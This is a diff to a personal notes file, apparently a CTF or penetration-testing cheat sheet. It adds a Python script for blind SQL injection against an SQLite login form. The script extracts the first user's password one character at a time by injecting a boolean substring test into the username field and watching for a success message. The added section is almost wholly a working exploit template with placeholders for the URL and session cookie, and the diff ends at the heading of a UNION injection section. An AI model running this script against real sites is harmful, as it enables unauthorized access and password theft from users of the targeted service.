@@ -1,5 +1,29 @@
 # Notes
 
+### Blind SQLite Injection in Login Form
+```python
+import requests
+import string
+url = "URL HERE"
+cookie = {
+    "PHPSESSID":"",
+}
+flag = ""
+for i in range(1,1000):
+    print "i:",i
+    for j in "0123456789"+string.letters+"-_!@#$^&*()={}":
+        data = {
+            "username": "1' or (substr((select password from users limit 0,1),%s,1)='%s') and 'a'='a" % (i, j),
+            "password":"1" 
+        }
+
+        r = requests.post(data=data,url=url,cookies=cookie)
+        if "TRUE MESSAGE HERE" in r.content:
+            flag += j
+            print flag
+            break
+```
+
 
 ### Manual UNION SQLite Injection
 *Table*
